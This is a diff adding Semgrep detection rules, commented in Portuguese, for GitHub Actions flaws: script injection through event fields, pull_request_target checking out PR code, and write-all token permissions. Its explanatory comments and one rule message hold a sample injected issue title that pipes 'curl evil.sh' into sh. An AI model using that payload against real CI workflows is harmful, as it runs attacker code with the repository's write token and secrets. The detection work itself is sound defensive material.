@@ -1,0 +1,99 @@
+rules:
+  # ---------------------------------------------------------------------------
+  # Injecao de comando em workflow do GitHub Actions.
+  #
+  # NAO sao regras do RAPTOR -- o conjunto dele nao tem NENHUMA regra de
+  # infraestrutura ou CI (conferido: zero arquivos com `languages: [yaml]`,
+  # `dockerfile`, `terraform` ou `hcl`). E o raptor-win tambem nao mandava pack
+  # do Registry para `.yml`/`.yaml`. Era ponto cego inteiro.
+  #
+  # A CLASSE. `${{ ... }}` nao e' variavel de ambiente: o runner faz
+  # SUBSTITUICAO DE TEXTO no script ANTES de o shell existir. Um titulo de issue
+  # com `"; curl evil.sh | sh; #` vira comando. Nao ha' aspas que protejam, nem
+  # escape que o shell possa aplicar -- quando o shell le', o texto do atacante
+  # JA' E' o script.
+  #
+  # O estrago depende do gatilho. Em `pull_request_target`, `issue_comment` e
+  # `issues` o workflow roda com `GITHUB_TOKEN` de ESCRITA e acesso aos secrets
+  # do repositorio, e o conteudo e' de quem abriu a issue ou o PR -- qualquer
+  # pessoa. E' o "pwn request".
+  #
+  # A CORRECAO e' sempre a mesma: passar por `env:` e usar `"$VAR"` no script.
+  # Aí o valor vira dado para o shell, nao texto no script.
+  # ---------------------------------------------------------------------------
+  - id: raptorwin.infra.gha-injecao-em-run
+    message: >-
+      Conteudo controlado por terceiro interpolado direto num `run:`. O runner
+      substitui `${{ ... }}` no texto do script ANTES de o shell existir, entao
+      um titulo de issue com `"; curl evil.sh | sh; #` vira comando -- nenhuma
+      aspa protege. Passe por `env:` e use `"$VAR"`
+      (`env: {TITULO: ${{ github.event.issue.title }}}` e `echo "$TITULO"`).
+    languages: [yaml]
+    severity: ERROR
+    patterns:
+      - pattern-inside: |
+          run: ...
+      - pattern-regex: >-
+          \$\{\{\s*(github\.event\.(issue|pull_request|comment|discussion|review|head_commit)\.[A-Za-z_.]*(title|body|message|name|label|ref|login|email)|github\.event\.pages|github\.head_ref|github\.event\.workflow_run\.head_branch)[^}]*\}\}
+    metadata:
+      cwe: ["CWE-78: Improper Neutralization of Special Elements used in an OS Command"]
+      owasp_top_10: ["A03:2021-Injection"]
+      tags: ["security", "ci", "github-actions", "command-injection", "pwn-request"]
+
+  # ---------------------------------------------------------------------------
+  # `pull_request_target` que faz checkout do codigo do PR.
+  #
+  # O gatilho existe para dar ao workflow o token e os secrets do repositorio
+  # ALVO -- e' isso que o separa do `pull_request` comum. Fazer checkout do
+  # `head.sha` nesse contexto traz o codigo de quem abriu o PR para dentro de um
+  # job que ja' tem as chaves na mao. Basta um `npm install` (que roda script de
+  # pacote), um passo de build, ou qualquer coisa que execute o que veio junto.
+  #
+  # NAO e' teorico: e' o formato documentado do "pwn request", e ja' rendeu
+  # vazamento de token em projeto grande.
+  # ---------------------------------------------------------------------------
+  - id: raptorwin.infra.gha-pull-request-target-com-checkout
+    message: >-
+      `pull_request_target` com checkout do codigo do PR. Esse gatilho roda com
+      o token de ESCRITA e os secrets do repositorio alvo, de proposito -- e o
+      checkout traz o codigo de quem abriu o PR para dentro desse job. Qualquer
+      passo que execute o que veio (build, `npm install`, teste) entrega as
+      chaves. Se precisa mesmo do conteudo do PR, separe em dois workflows: um
+      sem privilegio que so' constroi, e outro que consome o artefato.
+    languages: [yaml]
+    severity: ERROR
+    # UMA regex so'. Dois `pattern-regex` dentro de `patterns` exigem que os
+    # dois casem a MESMA regiao -- nao "o arquivo tem A e tambem B". Separados,
+    # a regra compilava e NUNCA disparava, que e' o pior dos dois mundos:
+    # medido, o arquivo de amostra com o defeito passava limpo.
+    pattern-regex: >-
+      (?s)pull_request_target.*?uses:\s*actions/checkout@.*?ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(sha|ref)
+    metadata:
+      cwe: ["CWE-829: Inclusion of Functionality from Untrusted Control Sphere"]
+      owasp_top_10: ["A08:2021-Software and Data Integrity Failures"]
+      tags: ["security", "ci", "github-actions", "pwn-request"]
+
+  # ---------------------------------------------------------------------------
+  # Permissao do GITHUB_TOKEN escrita larga demais.
+  #
+  # `permissions: write-all` (ou `contents: write` sem necessidade) da' ao job o
+  # direito de reescrever o repositorio. Se QUALQUER passo do job executar
+  # codigo de terceiro -- e uma action de terceiro ja' e' isso --, esse direito
+  # vai junto.
+  #
+  # O padrao do GitHub para repositorio novo ja' e' restrito; quem escreve isto
+  # esta' AMPLIANDO de proposito, e quase sempre porque um passo especifico
+  # precisava. A correcao e' declarar a permissao no passo, nao no workflow.
+  # ---------------------------------------------------------------------------
+  - id: raptorwin.infra.gha-permissao-larga
+    message: >-
+      `permissions: write-all` da ao job direito de reescrever o repositorio, e
+      todo passo dele herda isso -- inclusive as actions de terceiro. Declare a
+      permissao minima, e no JOB que precisa dela, nao no workflow inteiro.
+    languages: [yaml]
+    severity: WARNING
+    pattern-regex: "permissions:\\s*write-all"
+    metadata:
+      cwe: ["CWE-250: Execution with Unnecessary Privileges"]
+      owasp_top_10: ["A01:2021-Broken Access Control"]
+      tags: ["security", "ci", "github-actions", "permissions"]
